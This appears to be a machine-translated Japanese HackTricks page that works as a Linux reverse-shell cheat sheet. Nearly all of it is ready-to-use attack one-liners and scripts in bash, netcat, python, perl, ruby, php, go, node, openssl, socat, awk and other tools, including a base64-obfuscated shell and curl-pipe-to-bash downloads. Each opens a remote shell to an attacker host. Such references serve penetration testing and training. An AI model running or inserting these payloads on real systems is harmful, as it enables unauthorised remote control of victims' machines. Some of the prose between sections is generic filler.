# シェル - Linux

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**を使用して、ゼロからヒーローまでAWSハッキングを学ぶ**</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)または[**telegram グループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

**これらのシェルに関する質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **で確認できます**

## フルTTY

**逆シェルを取得したら、[**このページを読んでフルTTYを取得**](full-ttys.md)**してください。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### シンボルセーフシェル

他のシェルもチェックすることを忘れないでください：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、およびbash。
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### シェルの説明

1. **`bash -i`**: この部分のコマンドは、インタラクティブ (`-i`) Bash シェルを開始します。
2. **`>&`**: この部分のコマンドは、**標準出力** (`stdout`) と **標準エラー** (`stderr`) を **同じ宛先にリダイレクト** するための省略記号です。
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、指定された IP アドレスとポートへの TCP 接続を表す特別なファイルです。
* **出力とエラーのストリームをこのファイルにリダイレクト** することで、コマンドはインタラクティブシェルセッションの出力を攻撃者のマシンに送信します。
4. **`0>&1`**: この部分のコマンドは、**標準入力 (`stdin`) を標準出力 (`stdout`) と同じ宛先にリダイレクト** します。

### ファイルを作成して実行
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## フォワードシェル

LinuxベースのWebアプリケーション内の**Remote Code Execution (RCE)**脆弱性を処理する際、逆シェルを達成することがiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。そのような制約のある環境では、より効果的に侵害されたシステムとやり取りするために、PTY（擬似端末）シェルを確立する代替手段があります。

この目的のための推奨ツールは、[toboggan](https://github.com/n3rada/toboggan.git)であり、これにより対象環境とのやり取りが簡素化されます。

tobogganを効果的に利用するには、対象システムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`というモジュールは次のように構成されることがあります。
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
そして、次のコマンドを実行できます：
```shell
toboggan -m nix.py -i
```
直接インタラクティブシェルを活用するには、Burpsuite統合のために`-b`を追加し、より基本的なrceラッパーにするために`-i`を削除できます。

別の可能性は、`IppSec`のフォワードシェル実装[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)を使用することです。

次のように変更する必要があります：

- 脆弱なホストのURL
- ペイロードの接頭辞と接尾辞（あれば）
- ペイロードの送信方法（ヘッダー？データ？追加情報？）

その後、**コマンドを送信**したり、**`upgrade`コマンドを使用**して完全なPTYを取得したりできます（パイプは約1.3秒の遅延で読み取られ、書き込まれることに注意してください）。

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)で確認してください。
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnetは、ネットワーク上で他のコンピュータに接続するためのプロトコルです。通常、Telnetを使用してリモートシステムに接続し、コマンドを実行したりファイルを転送したりすることができます。Telnetはセキュリティ上のリスクがあるため、代わりにSSHなどのより安全なプロトコルを使用することが推奨されています。
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻撃者**
```bash
while true; do nc -l <port>; done
```
```
コマンドを送信するには、それを書き留めて、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）

**被害者**
```
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Pythonは、多くのハッカーにとってお気に入りのスクリプト言語です。Pythonは、シンプルで読みやすく、多くのOSで動作するため、ハッキングに最適です。Pythonは、ネットワークスキャン、データ解析、Webスクレイピングなど、さまざまなハッキングタスクに使用されます。Pythonの豊富なライブラリとモジュールは、ハッキングプロジェクトを効率的に実行するのに役立ちます。
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perlは、多くのUnixシステムで利用可能なスクリプト言語であり、シェルスクリプトの代替として使用されることがあります。Perlスクリプトは、システム管理、ログ解析、データ変換などのタスクに広く使用されています。Perlは、強力なテキスト処理機能を備えており、システム管理者やハッカーにとって便利なツールです。
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

### Ruby

Rubyは、多くのLinuxディストリビューションにデフォルトでインストールされていることが多いため、Rubyスクリプトを使用することができます。Rubyは、シンプルで読みやすい構文を持ち、多くの便利な機能を提供しています。Rubyスクリプトを使用することで、シェルスクリプトよりも高度な機能を実装することができます。Rubyは、Webアプリケーション開発やシステム管理など、さまざまな用途に使用されています。
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP（Hypertext Preprocessor）は、Web開発に広く使用されるスクリプト言語です。PHPは、サーバーサイドで実行され、動的なWebページを生成するために使用されます。PHPは、HTMLに埋め込んで使用することができ、データベースとのやり取りやフォームの処理など、さまざまなタスクを実行するための強力なツールです。
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncatは、ネットワークのデバッグ、セキュリティ監査、およびネットワーク上のデータの転送など、さまざまなネットワーク関連タスクを実行するための強力なツールです。
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

### Linux

#### Reverse Shell

To create a reverse shell in Golang, you can use the following code snippet:

```go
package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	conn, _ := net.Dial("tcp", "attacker.com:4444")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
```

Compile the code for the target platform:

```bash
GOOS=linux GOARCH=amd64 go build reverse_shell.go
```

This will create an executable binary named `reverse_shell`.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Luaは、軽量で高速なスクリプト言語であり、組み込みシステムやゲーム開発などのさまざまな用途に使用されています。Luaスクリプトを実行するためには、Luaのインタプリタが必要です。Luaは、シンプルな構文と豊富な機能を備えており、柔軟性が高いため、多くの開発者に愛用されています。Luaは、C言語で実装されており、C言語との統合が容易です。
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJSは、非同期イベント駆動のJavaScriptランタイム環境であり、サーバーサイドスクリプトを実行するために使用されます。NodeJSは、Webアプリケーションやネットワークアプリケーションの開発に広く利用されています。
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

攻撃者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### バインドシェル
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### リバースシェル
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awkは、テキストとデータ処理のための強力なプログラミング言語です。Awkは、行指向のプログラミング言語であり、パターンスキャンと処理を行うために広く使用されています。Awkは、Linuxシステムで非常に便利であり、シェルスクリプト内でのデータ処理やフィルタリングによく使用されます。
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## フィンガー

**攻撃者**
```bash
while true; do nc -l 79; done
```
```
コマンドを送信するには、それを書き留めて、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）

**被害者**
```
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

## Gawk

Gawkは、強力なプログラミング言語であり、テキスト処理とパターンスキャンに特化しています。Gawkは、Linuxシェルスクリプト内で使用されることがよくあります。Gawkは、フィルタリング、テキスト処理、およびデータ抽出に広く使用されています。
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

これは、ポート6001であなたのシステムに接続しようとします：
```bash
xterm -display 10.0.0.1:1
```
逆シェルをキャッチするために使用できるもの（ポート6001でリッスンする）:
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)によるもの。注意: Javaの逆シェルはGroovyでも機能します。
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合は**、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**します。

</details>
